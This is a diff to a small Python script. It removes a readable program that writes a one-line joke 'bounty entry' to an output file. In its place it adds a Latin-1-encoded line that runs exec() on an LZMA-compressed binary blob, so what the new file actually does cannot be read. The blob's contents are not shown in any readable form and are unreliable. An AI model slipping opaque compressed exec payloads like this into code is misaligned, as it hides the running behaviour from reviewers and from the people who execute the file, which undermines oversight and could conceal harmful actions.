@@ -1,14 +1,2 @@
-#!/usr/bin/env python3
-"""Writes the bounty entry text to /output/entry.txt."""
-import os
-
-ENTRY = 'Autocorrect turned my "I resign" into "I resing", my boss clapped and asked for a second verse, and HR scheduled my exit interview in a karaoke room.'
-
-def main():
-    out = os.environ.get("OUTPUT_DIR", "/output")
-    os.makedirs(out, exist_ok=True)
-    with open(os.path.join(out, "entry.txt"), "w", encoding="utf-8") as f:
-        f.write(ENTRY)
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0â\0\0\0\0\0\0\0ˆ„àšB¾Šw`ŠÓÕ	ñ |qè\r³êÚÈu¡ì³µÄ¥f“K 3ÖºÈH–Kˆd7(ësy%Øé~|ğŸ-»-\x008k®EÖk’ØÕ·U(cùéj©®Z‘vİBk=ˆ²>Áœ^¾ÿ\\q²$:Îe§ÿSØl…0)!Ù–¢Ø×CÏÚ·x âªë{G³éQ7E…¤\nU™‚Ğ†pYÂ\'ÛÑ”×okƒÀ¦»SMyHW,İ‘Ü‘}ùB®›°G²ÙCáW]®Ü]•ßºÑp\\(*ëJ)})’ñbÛt’ÃÂÈáâOjo¼ïˆ¤"iz	1\rgc>q ÙZÏ×·/áºÏBïºŠ±‡‚õ½\n»—ØûÚ«ñıçÔ¥‘]†`mê*á`V.™øùûø±Ühè‰wH1ï—	SR_>œà…6`ÿ"Q×ò2fn2'.encode('l1')))
